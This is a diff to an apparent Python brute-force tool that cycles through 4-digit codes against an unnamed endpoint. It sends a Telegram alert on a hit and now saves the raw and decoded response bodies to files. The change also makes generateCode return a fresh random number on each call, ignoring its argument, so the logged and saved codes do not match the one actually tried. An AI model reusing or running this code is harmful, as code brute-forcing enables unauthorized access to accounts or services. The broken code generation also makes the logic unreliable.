@@ -1,5 +1,6 @@
 import logging
 import random
+import shutil
 from dataclasses import dataclass
 
 import requests
@@ -23,7 +24,8 @@ def_headers = {
 
 
 def generateCode(code: int):
-    return f"code=10{pad_number(code)}"
+    return str(random.randint(0, 9999)).zfill(4)
+    # return f"code=10{pad_number(code)}"
 
 
 def pad_number(num):
@@ -76,6 +78,12 @@ class BruteForce:
                     self.logger.info(f"{i}: {response.text} : {generateCode(i)}")
 
                     send_tg_found(self.log_name)
+                    with open(f'result-{generateCode(i)}', 'wb') as f:
+                        shutil.copyfileobj(response.raw, f)
+                    with open(f'result-{generateCode(i)}_decoded', 'wb') as f:
+                        response.raw.decode_content = True
+                        shutil.copyfileobj(response.raw, f)
+
                     input("Found interesting response!")
                     input("Press Enter to continue...")
                 iterations += 1
